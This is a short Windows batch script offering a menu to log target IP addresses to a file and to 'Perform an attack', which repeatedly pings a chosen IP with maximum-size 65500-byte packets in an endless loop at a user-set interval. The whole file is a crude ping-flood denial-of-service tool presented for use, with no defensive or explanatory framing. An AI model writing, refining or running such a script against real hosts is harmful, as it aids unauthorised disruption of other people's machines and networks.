@Echo off
:top

echo What would you like to do?
echo 1: Add an IP address
echo 2: Perform an attack
choice /n /c:12 /m ""%1
if errorlevel ==2 goto :two
if errorlevel ==1 goto :one

:one
set /p "ips=Input IP: "
echo "%ips%">>"ips.log"
goto :top

:two
set /p "ipad=Input ip: "
set /p "freq=Input freq: "
:loop
ping "%ipad%" -l 65500 -w 1 -n 1
timeout /t "%freq%" /nobreak
goto :loop

:end